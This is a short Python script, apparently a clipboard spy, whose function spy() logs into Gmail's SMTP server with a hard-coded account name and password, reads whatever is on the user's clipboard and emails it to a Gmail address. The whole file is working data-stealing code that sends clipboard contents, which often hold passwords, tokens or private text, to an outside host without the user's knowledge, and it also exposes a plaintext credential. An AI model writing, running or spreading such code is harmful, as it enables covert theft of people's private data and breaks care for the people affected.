import pyperclip
import smtplib
import time

def spy():

	#while True:

	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.ehlo()
	server.starttls()

	server.login("jacksonsoftwaresolutions", "Bt(c@245")
		
	data = pyperclip.paste().encode("utf-8") #.decode('utf-8')

	server.sendmail("jacksonsoftwaresolutions@gmail.com",
	"jacksonsoftwaresolutions@gmail.com", data)

	time.sleep(3600)

	server.close()

if __name__=="__main__":
	spy()